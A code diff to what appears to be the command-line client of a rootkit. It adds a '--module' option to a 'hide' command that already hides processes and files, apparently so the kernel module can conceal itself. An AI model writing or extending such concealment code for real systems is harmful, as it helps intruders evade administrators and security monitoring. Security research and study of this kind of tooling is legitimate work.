@@ -8,12 +8,14 @@
 #include <sys/types.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <stdbool.h>
 
-enum { opt_hide_pid, opt_hide_file };
+enum { opt_hide_pid, opt_hide_file, opt_hide_module };
 
 static const ko_longopt_t hide_longopts[] = {
 	{ "pid", ko_required_argument, opt_hide_pid },
 	{ "file", ko_required_argument, opt_hide_file },
+	{ "module", ko_no_argument, opt_hide_module },
 	{ NULL, 0, 0 }
 };
 
@@ -43,10 +45,19 @@ static int hide_file(char *path)
 	return ret;
 }
 
+static int hide_module(void)
+{
+	char *msg = "hide --module";
+	return comm(msg, strlen(msg));
+}
+
 int hide_command_handler(int argc, char **argv)
 {
 	pid_t pid = -1;
 	char *file = NULL;
+	bool hide_mod = false;
+
+	int ret = 0;
 
 	int c;
 	ketopt_t o = KETOPT_INIT;
@@ -66,20 +77,31 @@ int hide_command_handler(int argc, char **argv)
 				file = o.arg;
 			}
 			break;
+		case opt_hide_module:
+			hide_mod = true;
+			break;
 		}
 	}
 
-	if (pid != -1 && file != NULL) {
-		error("Command flags --pid and --file are mutually exclusive.\n");
+	if (pid == -1 && file == NULL && !hide_mod) {
+		error("No flags provided.\n");
 		return -1;
 	}
 
-	if (pid != -1)
-		return hide_process(pid);
+	if (pid != -1) {
+		ret = hide_process(pid);
+		if (ret)
+			return ret;
+	}
 
-	if (file != NULL)
-		return hide_file(file);
+	if (file != NULL) {
+		ret = hide_file(file);
+		if (ret)
+			return ret;
+	}
 
-	error("Failed to find argument.\n");
-	return -1;
+	if (hide_mod)
+		return hide_module();
+
+	return 0;
 }
